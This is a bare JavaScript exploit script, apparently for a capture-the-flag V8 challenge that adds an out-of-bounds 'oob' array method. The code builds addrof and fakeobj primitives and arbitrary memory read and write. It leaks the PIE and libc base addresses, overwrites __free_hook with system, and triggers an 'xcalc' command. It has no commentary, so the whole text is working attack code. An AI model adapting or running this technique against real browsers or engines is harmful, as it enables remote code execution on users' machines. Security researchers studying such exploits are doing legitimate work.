var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var obj = {"A": 1};
var obj_arr = [obj];
var float_arr = [1.1, 2.2, 3.3, 4.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj) {
    obj_arr[0] = in_obj;
    obj_arr.oob(float_arr_map);
    let addr = obj_arr[0];
    obj_arr.oob(obj_arr_map);

    return ftoi(addr);
}

function fakeobj(addr) {
    float_arr[0] = itof(addr);
    float_arr.oob(obj_arr_map);
    let fake = float_arr[0];
    float_arr.oob(float_arr_map);

    return fake;
}

var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function aar(addr) {
    if(addr % 2n == 0)
        addr += 1n;

    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    return ftoi(fake[0]);
}

function aaw_init(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}


function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    aaw_init(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

var test = new Array([1.1, 2.2, 3.3, 4.4]);

var test_addr = addrof(test);
var map_ptr = aar(test_addr - 1n);
console.log("[+] map_ptr: 0x" + map_ptr.toString(16));
var map_sec_base = map_ptr - 0x2f79n;
var heap_ptr = aar(map_sec_base + 0x18n);
var PIE_leak = aar(heap_ptr);
var PIE_base = PIE_leak - 0xd87ea8n;
console.log("[+] PIE_leak: 0x" + PIE_leak.toString(16));
console.log("[+] PIE_base: 0x" + PIE_base.toString(16));
var puts_got = PIE_base + 0xd9a3b8n;
var libc_base = aar(puts_got) - 0x6f6a0n;
var __free_hook = libc_base + 0x3c67a8n;
var system = libc_base + 0x453a0n;
console.log("[+] puts_got: 0x" + puts_got.toString(16));
console.log("[+] libc_base: 0x" + libc_base.toString(16));
console.log("[+] __free_hook: 0x" + __free_hook.toString(16));
console.log("[+] system: 0x" + system.toString(16));

arb_write(__free_hook, system);

console.log("xcalc")
